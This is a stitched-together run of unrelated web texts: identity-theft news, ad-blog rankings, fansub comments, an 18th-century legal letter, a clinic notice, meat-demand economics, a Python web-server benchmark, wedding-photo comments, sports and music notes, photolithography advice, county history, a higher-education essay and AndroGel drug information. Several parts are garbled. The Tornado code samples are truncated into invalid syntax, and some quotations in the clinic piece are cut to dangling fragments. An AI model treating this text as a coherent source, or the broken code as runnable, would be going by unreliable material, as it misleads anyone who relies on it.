God’s grace and peace also equips us to be effective witnesses for Jesus, overflowing from our heart and spilling over into our relationships through our words and actions. Others will see the growing influence of Jesus in us as we know God better.
The abundance of grace and peace are vital signs of a changed life in the Year of Transformation.

This week, the Identity Theft Spy blog showcased the DoJ's findings along with a news story about a pastor and his wife being charged with the crime.
The DoJ study focused on a six-month period in 2004, finding that approximately 3% of the households in the nation -- about 3.6 million of them -- have suffered from identity theft. Forty-eight percent of households experienced an unauthorized use of credit cards, and the banking accounts of 25% were misused without their knowledge. Meanwhile, personal information from 15% of the households was misused, and the remaining 12% suffered multiple identity thefts.
The report added that households headed by people between the ages of 18 and 24 are more susceptible to identity theft. If the household income exceeds $75,000, the chances of identity theft are compounded, the report said, adding that the theft is not limited by race or ethnicity.
Also of note, an identity thief doesn't always fit with Hollywood's stereotypical loner in a dark room who's getting paid by organized criminal gangs to hack into bank accounts.
The blog makes that point by referencing an article in The Star-Ledger of Newark, N.J. about how Rev. Dwight Gill of New Hope Baptist Church in East Orange was arrested and charged with identity theft, along with his wife.
The story reported that Gill, leader of the church for more than a decade, was a pillar of the community, serving as president of the United Clergy of the Oranges and having a long record of civic and political involvement.
Specifically, police there said the pastor and his wife were charged with two counts of fraudulent credit cards, one count of identity theft and theft of services.
East Orange Deputy Chief Ronald Borgo wouldn't elaborate on the nature of Gill's alleged scheme or whether members of his congregation were among the victims, the newspaper reported. Borgo didn't know how long Gill and his wife allegedly had the credit cards or how much was charged.
The newspaper reached Gill at his home, but he wouldn't comment directly on the charges.
"I'd like to just say that God is good," he told the Star-Ledger, "and I hope through prayer that we can work this situation out."
Wherever the thief may lurk, the blog offered suggestions on how individuals can protect themselves. One way is for enterprises to embrace two-factor authentication.
"Identity thieves are coming up with innovative ways to gain entry into systems that house your data … cracking passwords using dictionary attacks, rainbow tables, or social engineering techniques," the blog said, adding that organizations "can prevent this intrusive occurrence" by adopting some form of two-factor authentication, where individuals are required to type in a password or pin number and also provide an additional form of identification.
The blog said this can be in the form of devices users can carry, like a card or token, or by using something like a fingerprint or iris scan.Seafloor off Lighthouse Point Park, Santa Cruz, California

This time I've used Technorati rather than Alexa rankings, in other words it's based on number of links rather than traffic (incidentally Technorati also only ranks blogs, not websites in general).
A better method, do you think, or not?
The results are not amazingly dissimilar to last time, though some of the planners blogs have gone a bit higher - which sees Faris and Adliterate enter the chart. Congrats to them.
Top 25 Ad Blogs
Top 10 UK Ad Blogs
UK means UK-based. Ad blog means ad blogs not marketing blogs, hence no Gapingvoid. Paul Colman requested Life In The Middle not be classed as an ad blog, so Paul is not there. Also, I'm only counting English language blogs.
No doubt I've missed one out. Do let me know and I'll put it in next month.
11 comments:
I want to thank the little people who I will continue to step on in the future to remain on the list.
Darn it, that means dirty tricks used to get pervs to visit my dodgy posts aren't going to work any more.
gapingvoid is an ad blog, isn;t it? ;-)
While I'm uninterested in being included in the list, I do quite like being mentioned in the blurb underneath the it. Makes me sound quite pompous, in a way I quite like.
woot! Damnit, Hugh. Do you really need more attention! :)
Sad I know (& I'm not completely convinced I read Technorati data correctly), but I think this makes me in with a bullet at no.5 in the UK chart - hey,it's important to me ;-)
(And I'm sure there's others out there who would beat me anyway)
Jon - sorry I missed you off, I'll put you in next time. Keep up the good work at Living Brands, I really enjoyed checking it out today.
Paul - happy to continue mentioning that I'm not going to mention you...
Hugh - I don't know how to classify gapingvoid really. Is it a blog about advertising or... is it that the blog IS a form of advertising? Plus you're doing the marketing for Stormhoek and English Cut, right, not just our tiddly advertising bit? I suspect you're some kind of hybrid and we'll have to invent a special table just for you...
I was going to post that perhaps I was a sitter for tenth place () but that would have meant knocking Gwen off the list, and her blog is way more interesting than mine.
But it seems that Jon has popped me out of the top 10 anyway (sigh)
Jason you are right, it should have been you in tenth place.
To atone for my error, I shall now add Memehuffer to my blogroll, which i should have done before anyway as it is good.
How do you classify an "ad" blog, I think Only Dead Fish is great but not written by someone in a classic ad agency, but about advertising, brands, ideas etc
Thanks brother.Oh hai. EDIT: Chapter file is fucked, we know. Quattro forgot to save it before muxing apparently. If you want it and can’t live without chapters, click here to download it.

Crunchyroll has decided to get this series.
Is WhyNot still gonna sub this?
P.S. Thanks for the hard work as usual.
looking forward to them using cr’s translation
It’s a 12 hour latecast. We won’t be waiting for CR.
Thank you!
Thank you!
Guys, never miss the word “Devil” when Zen is using it. It’s important to the story and also his character trade mark.
I’ll constantly remind the editor and translator~
hello just a question, aren’t u going to sub Jormungand?
it’s in your list
Reread that list then.
soka, i just read it. so what you have to do is wait if there’s an actual simulcast. what does that simulcast mean? :S if you don’t mind.
If there’s a legitimate simulcast (not late), we’ll pick it up. If not, watch gg (vale is translating it for them anyway).
oh okay then. :)
SWEET! This show is looking awesome! JUST AS I EXPECTED!
Thanks so much for the episode!
HAVE A GOOD NIGHT!
Thanks for the release~
A typo at 10:08 it says “Isihaya”.
I so nervous.
So is I.
Is it just me whose MPC (Runnining latest CCCP) crashes as soon as it tries to open the file? Player is fine, play other files with no issue.
And yes, CRC32 matches
Whatever, managed to get it working in VLC. but i got this several times. Seriously, WTF?
Couldn’t say. Played perfectly fine for me using cccp. Maybe you could try to reinstall. Something may have gotten corrupted.
No problems on my end. Using MPC-HC which comes with CCCP 2011-11-11, LAV Audio and Video filter.
As for the artefact, I could say it’s VLC’s problem. I never used VLC so I could be wrong, but I heard VLC is known to have problems playing 10-bit video.
To WhyNot staff, the typeset @00:07 missing the “a” alphabet on “Hakoniwa Academy”. Not much of an issue, but you could consider this to be fixed on the batch.
Thank you for the release.
Well, I am having some problems with artifacts, It is 10 bits right ? because it’s weird all the other 10 bit releases i have are playing perfectly…Maybe a part of the file got corrupted.
It didn’t. And it is 10bit.
Why do you translate parameters as status?
I think parameters fits well considering Nisio Isin’s meta writing style.
Also Zen says devil quite often, is his thing. And it’ll become important later if there’s another season.
Yeah, we’ll watch out for it. And we didn’t like it.
It seems to crash Windows Media player on open for me.
Instead of offering an xml wouldn’t it be better for most people if you offered an xdelta patch file? most people can’t mux but most of them can run a bat file.
With the batch. It’s not that important.
Im also having trouble with this episode playing in mpc-hc. I’ve updated it to the latest version, reinstalled it, installed both the x32 and x64 versions and Ive checked cccp. I tried like 10 other files, 10bit and non 10bit, and they worked fine. I was wondering if you have any advice as to what might be wrong.
Thanks :D

"Sir,
The inclosed Letter (not found) addressed to the Gentlemen nominated in the Commission in conjunction with myself, will in part inform You of the steps taken by me to carry it into Execution - At the Same time I wrote the County Lieut: of Hampshire, that I should attend, & inclosed him a Precept to the Sheriff to summons Jurys accordingly. Tho' I was well aware there cou'd not be fifteen Days clear between its Teste & Return, which according to the established Practice in England there ought to have been, nor cou'd I find any Rule relative thereto laid down in any of our Acts of Assembly - Pursuant to my Letter, I proceeded to Houses' Ordinary on Sundays' Evening and waited there untill next morning at 9 o-clock, when, on finding not one of the other Gentlm to appear & knowing it cou'd answer no Purpose what ever, to go up alone, I embraced to opportunity of a Residenter in Hampshire, who was accidently returning home, to acquaint Col: Vanmeter by Letter, that he need not expect me for these and other Reasons therein mentioned & accordingly returned to my Residence -
Your Excellency must excuse me, when I assure you, I was far from being Sorry that the Purpose of the Comm'n was defeated, more particularly when it was owing to no Default of mine, as Nothing but the Duty which I thought I owed my Country, and that high Respect which ought to be paid to You as the supreme execute Magistrate thereof, cou'd possibly have induced me to act therein, tho' on receiving it, I at once determined So to do, notwithstanding the Inconvenience of the Season, being the Middle of Harvest. The extream Disagreeableness of the office & being So totally out of the Line of my Practice, as of all the Four mentioned in the Commn, I am the only Lawyer, who at present attends Hampshire Court.
Your Excellency, I hope will pardon me, when I take the Liberty of saying, that in my opinion, the Judges of the General Court & they only ought to Act on matters so nice, so delicate, may, so arduous, difficult & disagreeable as a Commn of Oyer & Terminer. It is Strictly their Office & by Study & Practice they have made themselves Masters of it - Theirs is the Honour, Theirs the Emoluments, and why shou'd they not take whatever may be troublesome or disagreeable therein - No man of Sensibility, ever pronounced the Common and ordinary Sentence of Death, much more than the Solemn Judgment in Treason, even upon the most notorious offender, but where a due Sense of the Duty he owed his Country & of a proper Execution of the Office he filled, called aloud upon him so to do.
The Act of Parliament of the 8th R. 2, enacts, that no Man of the Law, shall from thence forth be Justice of Assize, or of the Common Deliverance of Goals, in his own County, & the 33d H. S. enacts that no Justice or other Man, learned in the Law, shou'd exercise the Office of Justice of Assize within any County where he was born or inhabited, upon pain to forfeit 100 pounds - And these Statutes have always been construed to extend to Justices of Oyer & Terminer - I am well aware that the Stat: of the 12th Geo: 2, has taken away the Penalty, but every Gentlem of the Law, who has been in England knows the general Practice to conform to the old Law. This needs no Comment - Your own good Sense will & must furnish better than any I can offer -
I have too long troubled your Excellency, but can't conclude without observing that tho' the Act of Ass'y impowers You to nominate three or more Gent'n learned in the Law &c, The present Comm'n is directed to four of us by name, without saying "or any three," for which reason, unless we all had attended I shou'd have been of the Opinion, we cou'd not have proceeded, as all delegated authority must be construed strictly. This with the Hint thrown out in the beginning of this Letter, relative to the Precept to the Sheriff may perhaps merit your consideration, as giving orders to make out a future Commn.
These Hints, if I had not thought them material, as also that my Duty required it, I shou'd not have taken
the Liberty of troubling Your Excellency with. If they are not, my Judgement, not Will has erred. For be
assured, I Am, with the highest sentiments of Respect,
& Esteem,

VSU's FamilyWorks Offers Therapeutic Services to the Community
VALDOSTA -- Regardless of their ability to pay, no one is denied
therapy services at FamilyWorks,.”
From 10 a.m. to 2 p.m. on Friday, March 30, FamilyWorks will open its doors to the public, inviting everyone to visit the clinic during this open house, meet the staff, tour the facility, and learn what services are offered, all while enjoying a light refreshment. Area agencies that may be interested in referring clients in the future, including public school systems, are especially encouraged to stop by and learn more about how the clinic can help them.
Although Marriage and Family Therapy faculty members serve in a supervisory role and see a few clients, FamilyWorks is a student-run clinic, said Dr. Kate Warner, a licensed marriage and family therapist, professor, and program director. First-year graduate students handle the intake process, including scheduling the client’s first appointment, gathering relevant background and contact information, documenting what prompted the client to seek therapy, and matching the client with a therapist. Advanced standing graduate students serve as the therapists.
Warner said that students graduate from the Marriage and Family Therapy Program with the know-how to operate their own private practice -- should they aspire to do so. She said this knowledge is vital to their future as owner-operators and clinicians., noted Warner. The therapist’s goal is to help the client make the changes he or she wants to make, taking into account every aspect of the client’s life and focusing on the client’s natural resources.
Clients are referred by outside agencies, but the biggest source of client referrals come from other clients, Warner said. To the FamilyWorks team, these referrals are proof that the client doing the referring has had a good experience and believes that their friend or loved one will have the same.
“We value those,” she added.
“Those are the best,” said Dr. Martha Laughlin, a licensed marriage and family therapist, professor, and director of clinical training for the program., said Laughlin., said Dr. Jennifer Lambert-Shute, associate professor for VSU’s Marriage and Family Therapy Program.
FamilyWorks is located at 903 N. Patterson St. in the one-story annex connected to the Continuing Education building. The clinic entrance is next to Georgia Power..

USA Tue 7th Apr!The status of meat demand in general, and pork demand in particular, is a bit of a mystery at present. Professor Glenn Grimes of the University of Missouri recently released his first demand index computations for 2007 and the numbers were not at all pretty. The index for consumer-level pork demand is down 1.7% for January through March of this year, while choice beef demand was 0.8% lower and broiler demand was down a whopping 6.4%.
Professor Grimes' indexes measure the percentage change in demand vs. the same period one year ago. The demand indexes use per capita pork disappearance (assumed to be consumption), deflated retail prices and an assumed elasticity of demand to estimate the movement of an entire demand curve. (I have presented Professor Grimes' calculated numbers for demand elasticity of -0.75) These numbers do not represent a change in consumption or a change in price, but the relative changes in both variables.
The problem is that Professor Grimes' data, which are theoretically sound and correctly computed, do not square well with what we have seen at other levels of the meat industry this year.
Hog prices and pork cutout values have been substantially higher than one year ago in spite of production that is up 1.6%, year-to-date (YTD). Beef cutouts and fed cattle prices are higher, too, on production that is 1.4% higher, YTD. Wholesale chicken prices have been much higher, though one reason for that is a reduction of output that has been as large as 4.5% and is still 1.5% lower than in 2006.
The first two definitely imply higher demand for hogs and cattle at the producer level and pork and beef at the wholesale level. The last of those does not rule out higher wholesale chicken demand depending on the relative size of the price and consumption changes.
Another way to look at demand is to look at scatter diagrams that plot price-quantity pairs for specific time periods. Figures 1 through 3 show scatter diagrams for the first quarter of 2007 for pork, beef and broilers at the wholesale level. That is, the diagrams plot the deflated cutout values for beef and pork and deflated composite broiler price for broilers against first quarter production. The important thing about all three is that the 2007 observation is at least no closer to the origin of the graph. That means that wholesale demand is at least as good as last year for beef, slightly better for pork and, interestingly, much better for chicken.
Why the difference with the retail level demand indexes?
First, there are substantial time lags for price transmission. Retailers and foodservice operators will "eat" higher wholesale prices for some time before they mark up retail and menu prices. The reason is simple. Their customers don't like price increases and these business people are not interested in making life more difficult. On the other hand, prices are transmitted to the wholesale very quickly and thus would appear in these quarterly graphs.
Second (and you have heard me whine about this before), the retail price data are not very good. We had a system in place for three years that was gathering scanner price data for meats, but it lapsed when the U.S. Senate allowed the mandatory price reporting legislation to lapse in the fall of 2005. That legislation has finally been reauthorized, but USDA has neither issued new price reporting rules nor restarted the scanner price gathering effort. There is talk of getting it going again, so there is hope that we will have better retail data in the future.
Third, and possibly most important, exports have an impact on wholesale prices but not necessarily on retail prices. Exports are up for all three species this year, so this is a major factor.
Of course, the bad part of this story is the position of the 2006 price-quantity observation for pork. It was substantially below the 2004 and 2005 positions and reflects low chicken prices last year and a decline from the big demand surge in 2004 that was driven by high protein, low carbohydrate diets. But 2006 is history and 2007 appears to be off to a much better start. Let's just hope the remaining quarter can maintain that growth trend!

This release generated widespread interest among the Python and open source development communities. Rightfully so. There are many reasons to like Tornado. To begin with, it’s fast — and that’s fundamental for a web server. By using nginx as a load balancer and a static file server, and running a few Tornado instances (usually one per core available on the machine) it’s possible to handle thousands upon thousands of concurrent connections on relatively modest hardware; and this isn’t just theory. Tornado has already proven its worth in the field, by allowing FriendFeed to scale graciously.
Tornado is not only a fast web server, it acts as a very lightweight application framework as well. As such, it’s an appealing alternative to well established frameworks to the growing group of developers who’d like to develop “closer to the metal” and avoid the baggage associated with full-fledged web frameworks. The two things combined make Tornado ideal for developing “real time” web services and applications.
The feedback so far hasn’t been all positive though. Criticism of the project has mainly focused on the lack of test coverage and the fact that FriendFeed has opted not to contribute to, and improve on, the existing Twisted Web project (which has similar goals). To make things worse, there were a few nonchalant comments about it as well. Performance issues and lack of ease of use were the reported motivations for starting a new project from scratch.
Dustin Sallings started working on a hybrid solution (henceforth Tornado on Twisted) that would reportedly keep the good parts that Tornado introduced, while using Twisted as its core for networking and HTTP parsing.
At this point I became naturally curious about the speed of these three web servers. Is Tornado really faster than Twisted Web? And what about Tornado on Twisted, would it be faster or slower? Let’s find out.
Benchmark results
I ran a simple Hello World app for all three web servers. All the web servers were run in standalone mode without a load balancer. I stress tested the web servers with httperf using a progressively larger amount of concurrent requests. 100,000 requests were generated for each test. The web servers were run on a desktop machine with an Intel® Core™2 Quad Processor Q6600 (8M Cache, 2.40 GHz, 1066 MHz FSB) processor and 8GB of RAM. The operating system of choice was Ubuntu 9.04 (x86_64).
Without further ado, here are the results:
As you can see Tornado turned out to be faster than the rest of the Python web servers. Handling a peak of almost 3900 req/s with a single front-end and on commodity hardware is nothing to sneer at.
Twisted Web didn’t do too bad either (max. 2703.7 req/s), but the difference in performance is noticeable. Likewise, the performance of Tornado on Twisted was virtually identical to that of Twisted Web.
There you have it. I was curious about the possible outcome and now I know. Remember, this is a report on the numbers I got on my machine, not a research paper. But I hope that you find them interesting nevertheless.
Show me the code
Tornado:
import tornado.httpserver import tornado.ioloop import tornado.options), ]) http_server = tornado.httpserver.HTTPServer(application) http_server.listen(options.port) tornado.ioloop.IOLoop.instance().start() if __name__ == "__main__": main()
Twisted Web:
from twisted.internet import epollreactor epollreactor.install() from twisted.internet import reactor from twisted.web import server, resource class Simple(resource.Resource): isLeaf = True def render_GET(self, request): return "Hello, world!" site = server.Site(Simple()) reactor.listenTCP(8888, site) reactor.run()
Tornado on Twisted:
from twisted.internet import epollreactor epollreactor.install() from twisted.internet import reactor import tornado.options import tornado.twister), ]) site = tornado.twister.TornadoSite(application) reactor.listenTCP(options.port, site) reactor.run() if __name__ == "__main__": main()
UPDATE (September 14, 2009): stats, thank you..
Thin would probably still have been the more interesting thing to include here since Unicorn is not async (or is it?) and Thin is built on EM, which is often compared to Twisted.
Thin doesn’t take advantage of async as much as it could, though, either. It processes requests serially and synchronously — you can’t truly have two concurrent requests, which is probably the numbers looked bad. I’d like to see someone take Thin, break the Rack synchronous call style (keeping everything else from Rack), and build a light framework on top of that. This has been ripe for a while now.
Unicorn is not remotely async, it’s very explicitly one full-fledged UNIX
process per client. It’s intended for very different use cases than
Tornado or Twisted (or even Thin).
See the philosophy and design documents here:
P.S. I’m the primary author of Unicorn
Eric, I’m familiar with those documents. I needed a fast Ruby web server for comparison, so I used Unicorn. I have since removed it, as EventMachine HTTP Server provides a more than adequate comparison with the asynchronous web servers from the Python world.
Since Twisted supports more than one reactor, which reactor did you test? The default select reactor will not be as good as the epoll one, etc.
I often forget to change this and get a huge performance boost by changing one commandline option.
Jack, you just addressed one of Twisted issues for me: Code Usability.
Why by default doesn’t it use the best way of doing it? And if it isn’t possible in any way, why isn’t it stated very very very very clear everywhere? 😉
Jack, I used the default reactor. Using the epollreactor did not improve performance.
Hi.
Your post compares a C++ event framework wrapped on a thin Ruby layer with pure Python frameworks. It would have been nice of you to make that clear on the title or the introduction.
Cheers.
Alecco
Could you post the code/scripts you used for the benchmark? The EM results seem strange compared to the others.
Tornado doesn’t seem too “pure Python” to me =)
I agree with Alecco. What possessed you to add EM to this comparison? It only obfuscates the useful comparison you set out to make.
While it’s great to see EM performing so well, I wonder how much of the HTTP spec does it implement? It’s easy to write code that implements just enough of the spec to run the benchmark and have it blow away general purpose servers.
I’m not remotely surprised that tornado on twisted is slower than plain tornado — the code I pushed was the least code possible to get apps to run without API changes. In order to do that, I ended up wrapping existing code (i.e. adding indirection) to get it to go. There’s more work to go.
I do appreciate the benchmark, though. It gives us a starting point.
@labria
> Tornado doesn’t seem too “pure Python” to me =)
Sure, bad wording from me. Python doesn’t have straightforward calls to system calls. Both Twisted and Tornado seem to have have very tiny C modules to do handle the system call to the OS. But the main code is Python.
EventMachine seems a full blown asynchronous framework in C++.
Also, in my experience, EM raises some warning flags since it doesn’t use Boost/Asio.
@Ryan, Eric: I removed Unicorn from the benchmark.
@Alecco:).
@labria: I added the source code for each program.
@Patrick: I added a Python-only section with a chart that doesn’t include EM.
@Dan: I’m not sure. What I do know is that EM is a project that has potential and the Ruby community should pay attention to it.
@All: Thank you for all the feedback received so far. I’m evolving this post by incorporating valid suggestions. Keep them coming.

I didn’t say your test or analysis was invalid or pointless. Just asked to make it clear it’s apples and oranges, or perhaps oranges and mandarins. My exact phrasing:
>> “It would have been nice of you to make that clear on the title or the introduction.”
@Folletto:
It’s a goal, but it’s not as simple as you might think. If you’d like to help, see
@Antonio:
Personally, in the past I’ve had difficulties with the ApacheBench tool. Have you tried other HTTP benchmarking tools, like httperf? Also, I don’t know if any existing benchmarking tools do this, but it would be nice to see a scatter plot of how long each server takes to complete each request, rather than condensing everything down into a single number. For those of us interested in making some of these servers faster, that would produce a lot more interesting output, and perhaps illuminate some distinct bottlenecks :).
Thanks for stopping by Glyph. No matter how trivial the benchmark, I’m interested in its accuracy. If ab cannot be trusted, I’ll run the tests with httperf or siege and update my results.
httperf is a better tool if you really care about useful statistics.
@Bob: Indeed. I’m re-running all the benchmarks with httperf and will update this post very soon. Stay tuned.
Anotonio, thanks for the benchmark. But something is just not right here. There is no way one “framework” can beat another by so much. When it comes to massively parallel asynchronous I/O the bulk of the work is done by the kernel i.e. epoll() on Linux.
There are really two things going on:
a) I/O implementation (all of it is in C – for all your contenders)
b) Data marshaling b/w Ruby/Python and C
I just don’t see how one framework can be more performant than another. The differences you’re seeing can only be attributed to:
a) Richness of implementation, i.e. do all these “Hello world” apps do full HTTP headers parsing and forming “request objects”? How about initializing/maintaining other aspects of maintaining a request state? I doubt we’re looking at oranges-to-oranges here.
b) Error of configuration: did you make sure all of them rely on epoll()? This isn’t as trivial as it may appear since I/O libraries have a habit of falling back to slower select() or poll() silently.
@antonio Thanks for this very interesting benchmark. I see that you have pulled down the EventMachine chart. I am aware that this post is focused on evented python servers. However, EventMachine and Twisted Python are both Evented framework for respective language. look forward more content on EventMachine since that EM server is pushing out some really nice numbers, perhaps a seperate post ?
@Eugeny: The updated post ensures that all three web servers use epoll().
@Taylor: Yes, that’s a good idea.
What command-line options did you use with httperf? I’d like to try this test against various Ruby async http servers.
what? I wanted to see EM benchmarks… could you make another post comparing EM with Tornado please?
is cogen competitive?

Introducing the p.s. session
While a wedding is captured in just a day, the romance continues with the p.s. session. It allows a couple to revisit their wedding day and frame new moments in a more relaxed setting. Wear the dress you spent years dreaming about and months searching for, one more time. Be daring, be unexpected, be free.
Feel everything you did then, now.
Fantastic portrait session! The setting and props were just perfect. This series leaves me with the feeling as though you were able to capture the brides personality in your photos.. I loved it and thanks for sharing!!
Thanks so much! :) Glad you liked it!
What a great idea!!! Definitely not enough time on the day to have fun with the photos!!!
your right! that was my biggest regret about my own wedding!
I sometimes have second day shoots, which is pretty awesome, the bride and the groom have all the time they want.

Phenomenal photographs, they look absolutely stunning!! So unique, and incredibly creative – you’ve completely captured the beauty, happiness, & love in this woman’s expression, which is a difficult thing to do, but you have done it perfectly!! You have an incredible talent! Fabulous setting, styling, & detailing – the photograph with the close up of that delicate little clock necklace is my absolute favourite, it is just so stunning & communicates that idea of the photo capturing a moment out of time & preserving it forever! Love the images where she is holding that adorable little dog too :) Made me smile!!
Stay stylish Erica, & keep posting this amazing work here!!

Love this shoot, the concept is inspiring. I’ve always wanted to do a shoot with a wedding dress but haven’t ever got my hands on one. And how cute is that dog :)
GORGEOUS!
One day, I wish i can be as awesome a style blogger as you! <3

Hackney did not play football this past season. The 6-6, 310-pounder was the MEAC’s 2012 lineman of the year and a preseason FCS All-American candidate. He transferred to B-CU from Ole Miss in 2011. He had one year of eligibility remaining.
Addison, a safety, had five interceptions for the Wildcats as a junior this past season and was named to the Associated Press FCS All-America second team. He told the News-Journal last week: “After the season, I did some thinking and I felt I was ready to make the next step. I want to be able to better my future and help my family financially.”
Tight end Justin Henderson, who transferred from Memphis last year, said he is transferring again.
On the other side of the coin, Hialeah’s Alexander Morales, a 5-foot-11, 195-pound outside linebacker/strong safety, has verbally committed to the Wildcats. He joins DeLand linebacker Trenton Bridges on B-CU’s commitment list.

For music fans, a new suggestion: Camera Obscura. Actually, they've been around for a while -- but some new cuts on their latest effort named "My Maudlin Career" deserve a listen. Specifically, "The World Is Full Of Strangers," "Swans," "Away With Murder" and "The Sweetest Thing." Among my fellow Dylan fans, consensus seems to be that "Forgetful Heart" is among the best efforts from his new "Together Through Life." If you haven't heard Dylan in a while, here's a hint … he sounds … like a much older Bob Dylan. Looking for something ephemeral? Try "Floating" by Julee Cruise, a standby for me. It's good when you're trying to fall asleep on an airplane. If she sounds familiar, she did the theme song for "Twin Peaks" a few years back.
Okay. I'm out -- from the music business we turn our attention back to the news business. My thanks to Ann Curry for allowing me some time off. We hope to see you tonight.30 results was found matching keyword

Make sure your exposure is long enough, so that the SU8 at the substrate is fully cured. For very thick SU8 (though your 10 microns is not very thick), some people use an optical filter (lay it on top of the mask) to filter out sub-i-line wavelengths to improve curing down to the substrate surface. 2. Glass quality and the method by which the glass is formed can make a big difference. Glass has a lot of sodium and may also have boron, Mg and Zn. It is often not very uniform in composition and "dopant" segregation to surfaces is especially if the glass is cast or rolled from a nearly molten state. High concentrations of sodium can lead to adhesion problems. Slight etching in BOE or other HF can remove areas of high concentration (although this might make poorer quality glasses hazy.) Etching also roughens up the surface a little which helps in adhesion. Good luck! Mary -- Mary X.

Jersey County was founded on February 28, 1839, and was formed out of Greene County. The county was named for the state of New Jersey, from which many of the early settlers emigrated - which was itself named for the Channel Island of Jersey in Great Britain. The area quickly evolved into several small agricultural communities. As the area soon began to flourish, a county government was established and a courthouse was built in Jerseyville, the county seat. The present courthouse was built in 1893.

In reality, some concepts have hardly changed in hundreds of years, while others come and go so quickly they could be mistaken for a myth.
As things stand in 2013, institutions need to be ready to keep their current ground as well as prepare for growing trends in the short- to mid-term future. Long-term is a given, although my main reason to not mention it is because stakes are strangely higher in the short-term at the moment. As David Kernohan recently mentioned, “Institutional management has become an increasingly short-term enterprise”.
Whether you look at universities as competing elements or a bunch of diverse individuals, it would be wise to pay attention to what each institution is up to. A Russell Group member shouldn’t rest on its laurels, despite the perceptions of relative safety within such company. They should look further afield and pay attention to decisions made by new universities, private providers, and overseas players. Everything and everyone should be watched with interest.
That’s just an example. No matter where your university hangs on the tree of esteem, it’ll be worth checking out the strategic moves of others across a wide area. Perhaps you complain that private providers are only in it for the money, but if their surprise move successfully captures an active audience it’ll be up to everyone else to catch up. For some, it may be too late to catch up:
“…as many as 20 to 30 current…institutions could become unviable if student demand continues to fall.” [THE]
The quote above refers to concerns from HE leaders interviewed by PA Consulting Group. It looks like everyone is vying for as much audience as possible. The report found the biggest major concerns were of a decline in postgraduate student demand and further reductions in funding. The biggest moderate concern was an inability to grow alternative sources of profitable revenues. Hence the continuing need for healthy numbers of bums on seats.
This may annoy some readers. “Students should not be seen as pound signs.” “Using admissions as a way to tempt people and dump them with little to speak of later is a disgrace.”
And there is a fine line. Institutions clearly need to highlight unique selling points to get a steady stream of keen applications. However, as Janet Graham, director of the Supporting Professionalism in Admissions programme, says in today’s Times Higher Education:
“.”
In essence, a short-term view still requires a long-term attitude. All the more reason to keep track of new developments within a wide scope and at an early stage, so you can catch a glimpse of what’s playing out with time to breathe. Ish.
You may not wish to emulate particular success stories, partially in view of Janet Graham’s point above. However, you should build an understanding of what processes are working, whether they are relevant to your institution, and how you might be able to incorporate something similar into your plans.
Anything that seems dangerous or unacceptable may still contain useful fodder for your own future actions. You may be able to use it in a more reasonable way to make the point.
Plus, you can see where trends are starting to emerge. A small pool of providers may make a move toward something unusual, for instance. That’s a cue to assess what is going on and evaluate why the sudden interest is there. Always be on the lookout for clues. What looks strange today might be pretty standard tomorrow.
There is only so much you can do through surveys and studies and action groups. You won’t be first in everything. But when you’re not first, you should at least be aware so you can make well reasoned decisions to be close behind with a solid plan, rather than lag at the back in a frenzied attempt to mop up whatever is left.
Awareness also allows the confidence to dismiss some moves outright. Though mistakes are equally possible from this direction, none of us have a magical crystal ball lying around to get it right every time. Keeping careful watch and consideration is a reasonable alternative.
Question why new decisions have been made. Consider undisclosed background reasons behind why that direction is being taken. Could it work for you? Does it make sense? Is it reasonable? What’s missing? How can you find out more?
The short-term is where it’s at right now. That doesn’t mean the need for brash decisions. On the contrary, it often requires more consideration than ever.

If you're interested in using less gel, talk to your doctor about AndroGel 1.62% today. If you'd like more information on AndroGel 1%, just read on below and then discuss with your doctor.
AndroGel 1% is a controlled substance (CIII) available by prescription, used to treat adult men with low or no testosterone. It is a daily testosterone replacement therapy (TRT) that can raise low testosterone levels with daily use. The testosterone in AndroGel 1% is the same as the testosterone that your body makes naturally. And, when used daily, it can help you raise your T levels.
AndroGel 1% is clear, odorless, and quick-drying. And it offers packaging options in the form of a metered-dose pump or packets, so you and your doctor can choose what works best for you.
It is important to note:
AndroGel 1% can transfer from your body to others. This can happen if other people come into contact with the area where the AndroGel 1% was applied. Signs of puberty that are not expected have happened in young children who were accidentally exposed to testosterone through skin-to-skin contact with men using topical testosterone products like AndroGel 1%. Women and children should avoid contact with the unwashed or unclothed area where AndroGel 1% has been applied.
AndroGel 1% contains testosterone, which is absorbed through the skin after application. The testosterone in AndroGel 1% is the same as the testosterone your body makes naturally. It can help raise testosterone levels to the normal range in most men when used daily.
The most common side effects of AndroGel 1% are acne, skin irritation where the gel is applied, increased cholesterol levels, increased prostate specific antigen (a test used to screen for prostate cancer), increased red blood cell count, and increased liver function tests.
In a clinical study, of the 129 hypogonadal men who continued AndroGel 1% therapy for 6 months (with dose adjusted properly), 87% had their T levels restored to normal.
AndroGel 1% can cause serious side effects, including worsening symptoms of an enlarged prostate; possible increased risk of prostate cancer; lower sperm count; swelling of ankles, feet, or body; enlarged or painful breasts; problems breathing during sleep; and blood clots in the legs or lungs. Before you use AndroGel, tell your healthcare provider if you have breast cancer; prostate cancer; urinary problems due to enlarged prostate; heart, kidney, or liver problems; problems breathing while you sleep (sleep apnea); and/or have any other medical conditions.
AndroGel 1% is a topical testosterone replacement therapy. Since AndroGel 1% is a gel, there are a few things you should know about packaging and application before you begin treatment.
AndroGel 1% is available in a metered-dose pump and in packets. Our metered-dose pump contains enough gel for many uses. We also have pre-measured packets that contain enough gel for a single application for certain doses.
Your individual dosage may vary, so be sure to follow your doctor's instructions.
Whether you choose the pump or the packets, it is important that you understand the correct way to apply AndroGel 1%. Read below to find application information for both.
The AndroGel 1% metered-dose pump gives you the exact amount of medicine that your doctor has prescribed. Two pumps are included in your package of AndroGel 1%. If you are using the starting dose of AndroGel 1% (50 mg of testosterone in 5 grams of gel), this supply will last you 30 days.
Before using a new bottle of AndroGel 1% for the first time, you will need to prime the pump. To prime the AndroGel 1% pump, slowly push the pump all the way down 3 times. Do not use any AndroGel that came out while priming. Wash it down the sink or throw it in the trash to avoid accidental exposure to others. You do not have to prime your pump every day, only the first time you use it.
It is important that you apply AndroGel 1% exactly as your healthcare provider tells you to. Your doctor will tell you how much AndroGel 1% to apply. You can also check the label on your bottle to see how many times to press the pump for the dose your doctor has prescribed. It is important that you apply AndroGel 1% exactly as your healthcare provider tells you to.
Find your dose as prescribed by your physician
AndroGel 1% is also available in packets. Each packet contains 25 mg of testosterone in 2.5 g of gel or 50 mg of testosterone in 5 g of gel. After use, throw away the packet in the trash out of the reach of children to avoid accidental exposure.
Your healthcare provider may change your AndroGel 1% dose. Do not change your AndroGel 1% dose without talking to your healthcare provider.
AndroGel 1% is not meant for use in women.
When using AndroGel 1% it is important to note the following.
